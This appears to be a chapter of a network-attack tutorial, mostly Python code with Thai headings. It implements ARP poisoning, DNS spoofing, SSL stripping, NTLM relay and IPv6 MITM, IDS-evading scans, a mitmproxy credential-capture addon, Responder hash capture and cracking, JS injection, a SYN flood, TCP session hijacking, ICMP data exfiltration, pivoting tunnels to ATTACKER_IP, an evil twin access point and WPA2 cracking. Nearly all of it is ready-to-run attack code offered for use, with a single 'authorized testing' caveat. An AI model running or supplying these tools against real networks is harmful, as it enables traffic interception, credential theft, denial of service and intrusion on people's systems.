# Part 62: Network Security Advanced (Steps 611-620)

## Step 611: Network Protocol Analysis & Exploitation

การวิเคราะห์และโจมตี network protocols

```python
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse
import struct
import socket
import threading
from dataclasses import dataclass
from typing import List, Dict, Optional
import time

class NetworkAttacker:
    def arp_poisoning(self, target_ip: str, gateway_ip: str,
                       interface: str = "eth0"):
        """ARP poisoning for MITM"""
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        
        if not target_mac or not gateway_mac:
            print(f"[-] Could not get MAC addresses")
            return
        
        print(f"[+] Starting ARP poisoning:")
        print(f"    Target: {target_ip} ({target_mac})")
        print(f"    Gateway: {gateway_ip} ({gateway_mac})")
        
        # Enable IP forwarding
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        # Create ARP packets
        # Tell target that we are the gateway
        arp_target = ARP(
            op=2,               # ARP reply
            pdst=target_ip,     # Send to target
            hwdst=target_mac,   # Target MAC
            psrc=gateway_ip     # Pretend to be gateway
        )
        
        # Tell gateway that we are the target
        arp_gateway = ARP(
            op=2,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            psrc=target_ip
        )
        
        print(f"[+] Sending ARP poison packets (Ctrl+C to stop)...")
        
        try:
            while True:
                send(arp_target, verbose=False, iface=interface)
                send(arp_gateway, verbose=False, iface=interface)
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[*] Stopping ARP poisoning, restoring tables...")
            # Restore ARP tables
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                     psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[+] ARP tables restored")
    
    def dns_spoofing(self, interface: str = "eth0", 
                      spoof_map: Dict[str, str] = None):
        """DNS spoofing - redirect DNS queries"""
        if spoof_map is None:
            spoof_map = {"target.com": "192.168.1.100"}
        
        print(f"[*] DNS Spoofing active. Redirecting:")
        for domain, ip in spoof_map.items():
            print(f"    {domain} -> {ip}")
        
        def process_packet(packet):
            if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
                queried_name = packet[DNSQR].qname.decode().rstrip('.')
                
                if queried_name in spoof_map:
                    spoof_ip = spoof_map[queried_name]
                    print(f"[+] Spoofing {queried_name} -> {spoof_ip}")
                    
                    # Craft spoofed DNS response
                    response = (
                        IP(dst=packet[IP].src, src=packet[IP].dst) /
                        UDP(dport=packet[UDP].sport, sport=53) /
                        DNS(
                            id=packet[DNS].id,
                            qr=1,           # Response
                            aa=1,           # Authoritative
                            qd=packet[DNS].qd,
                            an=DNSRR(
                                rrname=packet[DNSQR].qname,
                                ttl=300,
                                rdata=spoof_ip
                            )
                        )
                    )
                    send(response, verbose=False, iface=interface)
        
        print(f"[*] Sniffing DNS queries on {interface}...")
        sniff(iface=interface, filter="udp port 53", 
              prn=process_packet, store=0)
    
    def ssl_stripping(self, listen_port: int = 8080,
                       target_port: int = 443):
        """SSL Stripping - downgrade HTTPS to HTTP"""
        print(f"[*] SSL Strip setup:")
        print(f"    1. Position as MITM (use ARP poisoning)")
        print(f"    2. Redirect HTTP traffic to our proxy")
        print(f"    3. iptables rule:")
        print(f"       iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {listen_port}")
        print(f"    4. Run sslstrip: sslstrip -l {listen_port}")
        
        return {
            "iptables_rule": f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {listen_port}",
            "sslstrip_cmd": f"sslstrip -l {listen_port}",
            "mitmproxy_cmd": f"mitmproxy -p {listen_port} --mode transparent"
        }
    
    def smb_relay_attack(self) -> dict:
        """SMB Relay attack setup"""
        return {
            "description": "Relay NTLM auth from one host to another",
            "requirements": [
                "SMB Signing disabled on target",
                "MITM position between two hosts"
            ],
            "steps": [
                "Disable SMB and HTTP responders in Responder.conf",
                "Run Responder: responder -I eth0 -rdwv",
                "Run ntlmrelayx: ntlmrelayx.py -tf targets.txt -smb2support",
                "Wait for NTLM authentication to relay",
                "For SAM dump: ntlmrelayx.py -tf targets.txt --smb2support -c 'command'"
            ],
            "commands": [
                "responder -I eth0 -rdwv",
                "ntlmrelayx.py -tf targets.txt -smb2support",
                "ntlmrelayx.py -tf targets.txt -smb2support -i  # Interactive shell",
                "ntlmrelayx.py -tf targets.txt -smb2support -e /tmp/shell.exe  # Execute"
            ]
        }
    
    def ipv6_mitm_attack(self) -> dict:
        """IPv6 MITM via rogue DHCPv6/Router Advertisement"""
        return {
            "description": "Exploit IPv6 auto-configuration to become default gateway",
            "tool": "mitm6",
            "commands": [
                "pip install mitm6",
                "mitm6 -d targetdomain.local  # Send rogue DHCPv6",
                "# Combine with ntlmrelayx:",
                "ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access",
                "ntlmrelayx.py -6 -t smb://TARGET_IP -smb2support"
            ],
            "how_it_works": [
                "Windows prefers IPv6 over IPv4",
                "mitm6 sends DHCPv6 responses claiming to be DNS server",
                "Windows uses our IPv6 address for DNS queries",
                "We respond with our IP, forcing NTLM authentication",
                "Relay captured NTLM to actual target"
            ]
        }

if __name__ == '__main__':
    attacker = NetworkAttacker()
    
    # SMB relay info
    smb_relay = attacker.smb_relay_attack()
    print("[*] SMB Relay Attack:")
    for step in smb_relay['steps']:
        print(f"  - {step}")
    
    # IPv6 MITM
    ipv6_mitm = attacker.ipv6_mitm_attack()
    print("\n[*] IPv6 MITM Commands:")
    for cmd in ipv6_mitm['commands']:
        print(f"  {cmd}")
```

## Step 612: Advanced Scanning Techniques

เทคนิคการสแกน network ขั้นสูงที่หลีกเลี่ยง IDS/IPS

```python
import nmap
import socket
import struct
import random
from scapy.all import *
from typing import List, Dict

class StealthScanner:
    def syn_scan(self, target: str, ports: List[int]) -> dict:
        """SYN scan (stealth scan) - never completes TCP handshake"""
        open_ports = []
        
        for port in ports:
            # Send SYN packet
            syn_pkt = IP(dst=target) / TCP(dport=port, flags="S", 
                                            seq=random.randint(1000, 65000))
            
            response = sr1(syn_pkt, timeout=1, verbose=False)
            
            if response:
                if response.haslayer(TCP):
                    if response[TCP].flags == 0x12:  # SYN-ACK = open
                        open_ports.append({"port": port, "state": "open"})
                        # Send RST to avoid completing handshake
                        rst_pkt = IP(dst=target) / TCP(dport=port, flags="R",
                                                       seq=response[TCP].ack)
                        send(rst_pkt, verbose=False)
                    elif response[TCP].flags == 0x14:  # RST = closed
                        pass
            # No response = filtered
        
        return {"target": target, "open_ports": open_ports}
    
    def decoy_scan(self, target: str, ports: List[int],
                    decoys: List[str] = None) -> str:
        """Nmap decoy scan to hide source"""
        if decoys is None:
            decoys = ["10.0.0.1", "10.0.0.2", "ME", "10.0.0.4"]
        
        decoy_str = ",".join(decoys)
        cmd = f"nmap -D {decoy_str} -sS -p {','.join(map(str, ports))} {target}"
        return cmd
    
    def idle_scan(self, target: str, zombie_ip: str, 
                   ports: List[int]) -> str:
        """Idle scan (zombie scan) - completely anonymous"""
        # Requires a zombie host with predictable IP ID sequence
        ports_str = ','.join(map(str, ports))
        cmd = f"nmap -Pn -sI {zombie_ip} -p {ports_str} {target}"
        
        print(f"[*] Idle Scan (Zombie: {zombie_ip})")
        print(f"[*] How it works:")
        print(f"    1. Get zombie's IP ID (must be predictable/incremental)")
        print(f"    2. Spoof SYN from zombie IP to target")
        print(f"    3. Check zombie's IP ID increment")
        print(f"    4. +1 = closed/filtered, +2 = open")
        
        return cmd
    
    def fragmented_scan(self, target: str, port: int,
                         fragment_size: int = 8) -> dict:
        """Fragmented scan to evade IDS/IPS"""
        # Fragment TCP SYN packet
        ip_pkt = IP(dst=target, flags="MF", frag=0)
        tcp_pkt = TCP(dport=port, flags="S")
        
        # Send in fragments
        fragment_cmd = f"nmap -sS -f --mtu {fragment_size} -p {port} {target}"
        scapy_cmd = f"send(fragment(IP(dst='{target}')/TCP(dport={port},flags='S'), fragsize={fragment_size}))"
        
        return {
            "nmap_cmd": fragment_cmd,
            "scapy_cmd": scapy_cmd,
            "description": f"Fragment packets into {fragment_size}-byte fragments"
        }
    
    def timing_evasion(self, target: str) -> dict:
        """Scan timing templates to avoid detection"""
        return {
            "T0_paranoid": f"nmap -T0 {target}  # Very slow: 5min between probes",
            "T1_sneaky": f"nmap -T1 {target}   # Slow: 15s between probes",
            "T2_polite": f"nmap -T2 {target}   # Polite: 0.4s between probes",
            "T3_normal": f"nmap -T3 {target}   # Normal (default)",
            "T4_aggressive": f"nmap -T4 {target} # Fast (common)",
            "T5_insane": f"nmap -T5 {target}   # Fastest",
            "random_delay": f"nmap --scan-delay 5s --max-scan-delay 10s {target}",
            "max_retries": f"nmap --max-retries 1 {target}  # Fewer retries = faster"
        }
    
    def application_layer_scan(self, target: str) -> dict:
        """Application-layer version detection and scripts"""
        commands = {
            "version_detection": f"nmap -sV --version-intensity 9 {target}",
            "os_detection": f"nmap -O --osscan-guess {target}",
            "scripts": {
                "all_vuln": f"nmap -sV --script vuln {target}",
                "auth": f"nmap -sV --script auth {target}",
                "brute": f"nmap -sV --script brute {target}",
                "http_enum": f"nmap -sV --script http-enum {target}",
                "smb_vuln": f"nmap --script smb-vuln* -p 445 {target}",
                "ms17_010": f"nmap --script smb-vuln-ms17-010 -p 445 {target}",
                "ssl_cert": f"nmap --script ssl-cert -p 443 {target}",
                "ssl_enum_ciphers": f"nmap --script ssl-enum-ciphers -p 443 {target}",
                "http_methods": f"nmap --script http-methods {target}",
                "dns_zone_transfer": f"nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.com -p 53 {target}"
            }
        }
        return commands

class NetworkPortKnocker:
    def send_port_knock(self, host: str, knock_sequence: List[int],
                         protocol: str = "tcp") -> bool:
        """Send port knock sequence to unlock service"""
        print(f"[*] Sending port knock sequence to {host}: {knock_sequence}")
        
        for port in knock_sequence:
            try:
                if protocol == "tcp":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect_ex((host, port))
                    s.close()
                elif protocol == "udp":
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(b'knock', (host, port))
                    s.close()
                
                print(f"  [+] Knocked port {port}/{protocol}")
                time.sleep(0.1)
            except Exception as e:
                pass
        
        print(f"[+] Port knock sequence complete")
        return True
    
    def discover_knock_sequence(self, host: str) -> str:
        """Methods to discover port knock sequences"""
        return """
# Methods to discover port knock sequences:

1. Sniff legitimate traffic to find sequence:
   tcpdump -i eth0 host TARGET_IP -w knock.pcap
   # Analyze pcap for connection pattern before service becomes available

2. Read knockd config (if accessible):
   cat /etc/knockd.conf

3. Look for backup/config files:
   knock TARGET_IP sequence1 sequence2 sequence3
   nc -l -p PORT  # Check if port opens after knock

4. Common default sequences to try:
   knock TARGET_IP 7000 8000 9000
   knock TARGET_IP 1234 5678 9012
        """

if __name__ == '__main__':
    scanner = StealthScanner()
    
    print("[*] Stealth Scan Techniques:")
    
    # Decoy scan command
    decoy_cmd = scanner.decoy_scan("192.168.1.1", [80, 443, 22])
    print(f"\n  Decoy: {decoy_cmd}")
    
    # Timing
    timing = scanner.timing_evasion("192.168.1.1")
    for name, cmd in list(timing.items())[:3]:
        print(f"  {name}: {cmd}")
    
    # NSE scripts
    app_scan = scanner.application_layer_scan("192.168.1.1")
    print("\n[*] NSE Script Examples:")
    for name, cmd in list(app_scan['scripts'].items())[:5]:
        print(f"  {name}: {cmd}")
```

## Step 613-620: Network Security Tools Suite

```python
import socket
import struct
import threading
import queue
from typing import List, Dict, Tuple
from scapy.all import *
import json

class NetworkSecurityToolkit:
    def responder_analysis(self) -> dict:
        """Responder tool for LLMNR/NBT-NS poisoning"""
        return {
            "tool": "Responder",
            "purpose": "Capture NTLM hashes via LLMNR/NBT-NS poisoning",
            "install": "git clone https://github.com/SpiderLabs/Responder",
            "commands": {
                "basic": "python3 Responder.py -I eth0 -rdwv",
                "analyze_only": "python3 Responder.py -I eth0 -A  # Passive mode",
                "with_wpad": "python3 Responder.py -I eth0 -rdwv -P  # WPAD poisoning",
                "verbose": "python3 Responder.py -I eth0 --lm -v"
            },
            "flags": {
                "-r": "Enable NBNS for queries via broadcast",
                "-d": "Enable NBNS for queries with domain suffix",
                "-w": "Start WPAD rogue proxy server",
                "-v": "Verbose mode",
                "-P": "Force NTLM auth for WPAD"
            },
            "captured_hashes_location": "/usr/share/responder/logs/",
            "crack_hashes": [
                "hashcat -m 5600 hashes.txt wordlist.txt  # NTLMv2",
                "john --format=netntlmv2 hashes.txt      # NTLMv2",
                "hashcat -m 5500 hashes.txt wordlist.txt  # NTLMv1"
            ]
        }
    
    def bettercap_commands(self, interface: str = "eth0") -> List[str]:
        """Bettercap for network attacks"""
        return [
            f"bettercap -iface {interface}  # Start bettercap",
            "# In bettercap interactive mode:",
            "net.probe on                    # Discover hosts",
            "net.show                        # Show discovered hosts",
            "set arp.spoof.targets 192.168.1.5  # Set MITM target",
            "arp.spoof on                    # Start ARP poisoning",
            "net.sniff on                    # Start sniffing",
            "set https.proxy.sslstrip true   # Enable SSL stripping",
            "https.proxy on                  # Start HTTPS proxy",
            "set dns.spoof.domains example.com  # DNS domain to spoof",
            "set dns.spoof.address 192.168.1.100  # Redirect to",
            "dns.spoof on                    # Start DNS spoofing",
            "# Inject JS into HTTP responses:",
            "set http.proxy.injectjs http://192.168.1.100/inject.js",
            "http.proxy on"
        ]
    
    def setup_transparent_proxy(self, listen_port: int = 8080) -> dict:
        """Setup transparent proxy with mitmproxy"""
        return {
            "iptables_rules": [
                f"iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port {listen_port}",
                f"iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port {listen_port + 1}",
                "# For IPv6:",
                f"ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port {listen_port}"
            ],
            "mitmproxy": f"mitmproxy -p {listen_port} --mode transparent --ssl-insecure",
            "mitmproxy_addon": """
# mitmproxy addon to capture credentials
from mitmproxy import http
import json

captured = []

def request(flow: http.HTTPFlow):
    if flow.request.method == 'POST':
        content = flow.request.text.lower()
        if any(k in content for k in ['password', 'passwd', 'pass=', 'token']):
            data = {
                'url': flow.request.pretty_url,
                'method': flow.request.method,
                'body': flow.request.text[:500]
            }
            captured.append(data)
            print(f'[+] Credentials captured: {json.dumps(data)}')
            """,
            "run_with_addon": f"mitmproxy -p {listen_port} --mode transparent -s credential_capture.py"
        }
    
    def network_pivoting_techniques(self) -> dict:
        """Network pivoting using different methods"""
        return {
            "ssh_local_forward": {
                "description": "Forward local port to remote service via SSH",
                "command": "ssh -L local_port:target_host:target_port user@pivot_host",
                "example": "ssh -L 8080:192.168.10.5:80 user@10.0.0.5",
                "access": "Browse http://localhost:8080 to reach 192.168.10.5:80"
            },
            "ssh_remote_forward": {
                "description": "Forward remote port back to local service",
                "command": "ssh -R remote_port:localhost:local_port user@pivot_host",
                "example": "ssh -R 4444:localhost:4444 user@10.0.0.5",
                "use": "Receive reverse shell connections on pivot host"
            },
            "ssh_socks_proxy": {
                "description": "Create SOCKS proxy through SSH",
                "command": "ssh -D local_port user@pivot_host",
                "example": "ssh -D 1080 user@10.0.0.5",
                "configure_proxychains": [
                    "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf",
                    "proxychains nmap -sT 192.168.10.0/24"
                ]
            },
            "metasploit_socks": {
                "description": "SOCKS proxy via Metasploit session",
                "commands": [
                    "use auxiliary/server/socks_proxy",
                    "set SRVPORT 1080",
                    "set VERSION 5",
                    "run -j",
                    "# Then use proxychains"
                ]
            },
            "ligolo_ng": {
                "description": "Modern tunneling tool for pentesters",
                "setup": [
                    "# On attacker:",
                    "./proxy -selfcert -laddr 0.0.0.0:11601",
                    "# On victim (pivot):",
                    "./agent -connect ATTACKER_IP:11601 -ignore-cert",
                    "# In ligolo-ng console:",
                    "session  # Select session",
                    "start    # Start tunnel",
                    "# Create route:",
                    "ip route add 192.168.10.0/24 dev ligolo"
                ]
            },
            "chisel": {
                "description": "TCP tunnel over HTTP",
                "server": "chisel server -p 8080 --reverse",
                "client": "chisel client ATTACKER_IP:8080 R:socks",
                "use": "SOCKS proxy on attacker port 1080"
            }
        }
    
    def packet_crafting_attacks(self) -> dict:
        """Custom packet crafting for testing"""
        return {
            "syn_flood": """
# SYN Flood (DoS) - FOR LAB/AUTHORIZED TESTING ONLY
from scapy.all import *
import random

def syn_flood(target_ip, target_port, packet_count=1000):
    for i in range(packet_count):
        ip = IP(src=f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}',
               dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535),
                 dport=target_port,
                 flags='S',
                 seq=random.randint(0, 2**32 - 1))
        send(ip/tcp, verbose=False)

if __name__ == '__main__':
    syn_flood('TARGET_IP', 80, 1000)
            """,
            "tcp_session_hijack": """
# TCP Session Hijacking (requires MITM position)
from scapy.all import *

def hijack_session(src_ip, dst_ip, src_port, dst_port, seq_num, ack_num):
    # Inject data into existing TCP session
    packet = (
        IP(src=src_ip, dst=dst_ip) /
        TCP(sport=src_port, dport=dst_port,
            flags='PA',  # PSH+ACK
            seq=seq_num,
            ack=ack_num) /
        Raw(load='injected data here')
    )
    send(packet, verbose=False)
            """,
            "icmp_tunnel": """
# Data exfiltration via ICMP
from scapy.all import *
import base64

def exfil_via_icmp(data: str, target_ip: str):
    encoded = base64.b64encode(data.encode()).decode()
    # Split into 32-byte chunks
    chunks = [encoded[i:i+32] for i in range(0, len(encoded), 32)]
    
    for i, chunk in enumerate(chunks):
        pkt = IP(dst=target_ip) / ICMP(id=i) / Raw(load=chunk)
        send(pkt, verbose=False)
    
    print(f'[+] Sent {len(chunks)} ICMP packets')
            """
        }
    
    def wireless_attacks(self) -> dict:
        """WiFi/wireless attack techniques"""
        return {
            "evil_twin": [
                "# Create evil twin access point:",
                "airmon-ng start wlan0",
                "# Create AP with hostapd:",
                "cat > /tmp/hostapd.conf << 'EOF'",
                "interface=wlan0",
                "ssid=TargetNetwork",
                "channel=6",
                "EOF",
                "hostapd /tmp/hostapd.conf",
                "# Setup DHCP:",
                "dnsmasq --interface=wlan0 --dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,12h"
            ],
            "wpa2_crack": [
                "airmon-ng start wlan0",
                "airodump-ng wlan0mon  # Find target AP",
                "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
                "# Deauth client to capture handshake:",
                "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon",
                "# Crack handshake:",
                "aircrack-ng capture-01.cap -w wordlist.txt",
                "# Or with hashcat:",
                "hcxdumptool -i wlan0mon -o capture.pcapng",
                "hcxpcapngtool capture.pcapng -o hash.hc22000",
                "hashcat -m 22000 hash.hc22000 wordlist.txt"
            ],
            "pmkid_attack": [
                "# PMKID attack - no deauth needed:",
                "hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1",
                "hcxpcapngtool capture.pcapng -o hash.hc22000",
                "hashcat -m 22000 hash.hc22000 wordlist.txt"
            ]
        }

if __name__ == '__main__':
    toolkit = NetworkSecurityToolkit()
    
    # Responder info
    responder = toolkit.responder_analysis()
    print("[*] Responder Commands:")
    for name, cmd in responder['commands'].items():
        print(f"  {name}: {cmd}")
    
    # Pivoting techniques
    pivoting = toolkit.network_pivoting_techniques()
    print("\n[*] Network Pivoting:")
    for technique, details in list(pivoting.items())[:3]:
        print(f"  {technique}: {details.get('description', '')}")
        if 'command' in details:
            print(f"    Command: {details['command']}")
    
    # WiFi attacks
    wireless = toolkit.wireless_attacks()
    print("\n[*] WPA2 Crack steps:")
    for step in wireless['wpa2_crack'][:5]:
        print(f"  {step}")
```
